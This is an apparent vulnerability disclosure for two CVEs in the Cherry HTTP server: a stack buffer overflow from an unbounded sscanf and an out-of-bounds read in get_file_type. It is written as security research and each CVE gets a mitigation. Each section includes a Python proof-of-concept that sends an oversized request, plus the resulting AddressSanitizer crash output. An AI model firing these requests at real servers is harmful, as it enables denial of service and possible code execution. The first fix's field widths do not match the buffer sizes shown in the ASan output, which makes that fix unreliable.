# CVE-2024-22086

I discovered a remote stack buffer overflow vulnerability in the Cherry HTTP Server through commit 4b877df in handle_request() at http.c, line 54:
```
sscanf(buf, "%s %s %s", method, uri, version); // for example, GET / HTTP/1.1
```

Any project that utilizes cherry is vulnerable to remote code execution.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to prevent a buffer overflow.

### Makefile Modifications

The following modifications were made to the Makefile to compile cherry with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the stack buffer overflow vulnerability:

```
CC=gcc
CFLAGS= -Wall -Wextra -DLOG_USE_COLOR -fsanitize=address -g

.PHONY: clean

cherry: server.c log.c rio.c http.c epoll.c task.c utils.c
	$(CC) $^ -o $@ $(CFLAGS)

clean:
	rm cherry a.out
	
```

### Compiling Cherry

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformed URI (2,000,000 bytes long) to cherry and wait for a response:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 3333))
sock.send(b"GET /"+b"C"*2000000+b"HTTP/1.1\r\nHost:localhost:3333\r\n\r\n")
response = sock.recv(4096)
sock.close()

```

### Starting Cherry

```
./cherry
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==3024==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fcf196002f0 at pc 0x7fcf1b087791 bp 0x7ffc4e0bf090 sp 0x7ffc4e0be850
WRITE of size 8188 at 0x7fcf196002f0 thread T0
    #0 0x7fcf1b087790 in scanf_common ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342
    #1 0x7fcf1b0883fe in __interceptor___isoc99_vsscanf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1612
    #2 0x7fcf1b0884ee in __interceptor___isoc99_sscanf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1635
    #3 0x55a0ffa0561d in handle_request /home/kali/projects/fuzzing/cherry/src/http.c:54
    #4 0x55a0ffa072c7 in request_handler /home/kali/projects/fuzzing/cherry/src/utils.c:57
    #5 0x55a0ffa03908 in main /home/kali/projects/fuzzing/cherry/src/server.c:69
    #6 0x7fcf1ae456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #7 0x7fcf1ae45784 in __libc_start_main_impl ../csu/libc-start.c:360
    #8 0x55a0ffa03450 in _start (/home/kali/projects/fuzzing/cherry/src/cherry+0x4450) (BuildId: f07795ccbe440d35fcd7b1ea59114aa3d9bc6d55)

Address 0x7fcf196002f0 is located in stack of thread T0 at offset 752 in frame
    #0 0x55a0ffa05370 in handle_request /home/kali/projects/fuzzing/cherry/src/http.c:35

  This frame has 7 object(s):
    [32, 176) 'sbuf' (line 41)
    [240, 752) 'uri' (line 37)
    [816, 1328) 'version' (line 37) <== Memory access at offset 752 partially underflows this variable
    [1392, 1904) 'filename' (line 40) <== Memory access at offset 752 partially underflows this variable
    [1968, 10160) 'method' (line 37) <== Memory access at offset 752 partially underflows this variable
    [10416, 18608) 'buf' (line 38)
    [18864, 27072) 'rio' (line 36)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342 in scanf_common
Shadow bytes around the buggy address:
  0x7fcf19600000: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600080: 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 00 00
  0x7fcf19600100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7fcf19600280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[f2]f2
  0x7fcf19600300: f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7fcf19600500: 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3024==ABORTING


```

From the output we can verify that a WRITE of size 8188 at occurred in thread T0.

### Mitigation

The issue with the code is that it doesn't limit the number of characters read into each string. This can cause a buffer overflow if the input strings are longer than the buffers allocated for method, uri, and version. To fix this, you need to specify maximum field widths in the sscanf format string. These widths should be at least one less than the size of the buffers (to leave space for the null terminator):

Buffer overflow vulnerability:

```
sscanf(buf, "%s %s %s", method, uri, version); // for example, GET / HTTP/1.1 
```

Modified code preventing a buffer overflow:
```
sscanf(buf, "%5000s %300s %300s", method, uri, version); // for example, GET / HTTP/1.1 
```

### References

* https://cwe.mitre.org/data/definitions/121.html
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
* https://github.com/google/sanitizers/wiki/AddressSanitizer
* https://www.cve.org/CVERecord?id=CVE-2024-22086


# CVE-2024-24341

I discovered a remote out-of-bounds read vulnerability in the function static const char *get_file_type(const char *extension) at http.c, line 174:

https://github.com/hayyp/cherry/blob/4b877df82f9bccd2384c58ee9145deaab94de4ba/src/http.c#L172-L175

Any project that utilizes cherry is potentially vulnerable.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself.

### Makefile Modifications

The following modifications were made to the Makefile to compile cherry with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the OOB read vulnerability:

```
CC=gcc
CFLAGS= -Wall -Wextra -DLOG_USE_COLOR -fsanitize=address -g

.PHONY: clean

cherry: server.c log.c rio.c http.c epoll.c task.c utils.c
	$(CC) $^ -o $@ $(CFLAGS)

clean:
	rm cherry a.out
	
```

### Compiling Cherry

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformed 'Host' header and wait for a response:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 3333))
sock.send(b"GET /hello HTTP/1.1\r\n"+b"."*65534+b" localhost:3333\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n\r\n\r\n")
response = sock.recv(4096)
sock.close()
```

### Starting Cherry

```
./cherry
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==327136==ERROR: AddressSanitizer: global-buffer-overflow on address 0x555910231910 at pc 0x55591022b10b bp 0x7ffe63b393c0 sp 0x7ffe63b393b8                                
READ of size 8 at 0x555910231910 thread T0                                            
    #0 0x55591022b10a in get_file_type /home/kali/projects/fuzzing/cherry/src/http.c:175
    #1 0x55591022aa78 in handle_error /home/kali/projects/fuzzing/cherry/src/http.c:94
    #2 0x55591022a6b7 in handle_request /home/kali/projects/fuzzing/cherry/src/http.c:61
    #3 0x55591022c2c7 in request_handler /home/kali/projects/fuzzing/cherry/src/utils.c:57
    #4 0x555910228908 in main /home/kali/projects/fuzzing/cherry/src/server.c:69
    #5 0x7f4169c456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #6 0x7f4169c45784 in __libc_start_main_impl ../csu/libc-start.c:360
    #7 0x555910228450 in _start (/home/kali/projects/fuzzing/cherry/src/cherry+0x4450) (BuildId: 860398ac6d4c051636b31a4cd9cd59c364d51fce)

0x555910231910 is located 0 bytes after global variable 'mime_list' defined in 'http.c:20:22' (0x5559102318a0) of size 112                                                  
SUMMARY: AddressSanitizer: global-buffer-overflow /home/kali/projects/fuzzing/cherry/src/http.c:175 in get_file_type
Shadow bytes around the buggy address:
  0x555910231680: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231700: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231780: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231800: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231880: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
=>0x555910231900: 00 00[f9]f9 f9 f9 f9 f9 00 00 00 00 f9 f9 f9 f9
  0x555910231980: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231a00: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231a80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231b00: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x555910231b80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==327136==ABORTING

```

ASan is reporting a global-buffer-overflow, because cherry tried to read memory outside the bounds of a global buffer.

Specifically, the error occurred in the get_file_type function in http.c at line 175. The problematic access is at the address 0x555910231910, which is exactly 0 bytes after the end of a global variable named mime_list. This variable is defined in http.c at line 20 and has a size of 112 bytes. The overflow means that the code tried to access memory immediately after the end of this global variable, which is not allowed.


### Mitigation

The issue lies in the get_file_type function. It iterates through the mime_list array until it finds a matching file extension. If it doesn't find a match, it returns mime_list[i].value, but by the time mime_list[i].type is NULL, `i` has already moved past the last valid index of mime_list, leading to the global-buffer-overflow error. To fix this, you should return a default MIME type when the loop does not find a match. Here is the corrected version of the get_file_type function:


Updated code in static const char *get_file_type(const char *extension) at http.c:

```
static const char *get_file_type(const char *extension)
{
    if (extension == NULL) {
        return "text/plain";
    }

    for (int i = 0; mime_list[i].type != NULL; ++i) {
        if (strcmp(extension, mime_list[i].type) == 0) {
            return mime_list[i].value;
        }
    }

    // Return a default MIME type if no match is found
    return "application/octet-stream";
}

```

In this version, if the function doesn't find a matching extension, it returns "application/octet-stream" by default, which is a generic binary file type and a safe default for unknown file types. This approach prevents the function from accessing out-of-bounds memory.

Additionally, ensure the mime_list is correctly terminated with a NULL entry. The last element should be {NULL, NULL} to correctly signal the end of the array during iteration:

```
static struct mime_t mime_list[] = {
    // ... [other entries] ...
    {".tar",  "application/x-tar"},
    {NULL, NULL}  // Terminating entry
};
```

This null entry acts as a sentinel value, indicating the end of the array when iterating through it.


### References

* https://cwe.mitre.org/data/definitions/125.html
* [CVE-2024-24341](https://www.cve.org/CVERecord?id=CVE-2024-24341)

